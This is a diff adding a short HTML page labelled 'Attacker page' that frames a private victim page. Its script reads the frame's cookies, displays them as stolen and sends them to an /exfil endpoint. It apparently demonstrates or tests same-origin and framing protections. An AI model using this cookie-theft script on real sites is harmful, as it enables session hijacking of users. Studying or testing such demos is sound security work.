@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Attacker parent</title></head>
+<body>
+<h1>Attacker page (parent)</h1>
+<iframe id="victim" src="/private/victim.html" style="width:100%;height:300px;border:1px solid #ccc"></iframe>
+<script>
+const frame = document.getElementById('victim');
+frame.addEventListener('load', () => {
+  try {
+    const c = frame.contentWindow.document.cookie;
+    document.body.insertAdjacentHTML('beforeend','<p>stolen cookie: <code>'+c+'</code></p>');
+    fetch('/exfil?q=' + encodeURIComponent(c)).catch(()=>{});
+  } catch (e) {
+    document.body.insertAdjacentHTML('beforeend','<p style="color:red">Cannot access iframe: ' + e + '</p>');
+  }
+});
+</script>
+</body>
+</html>
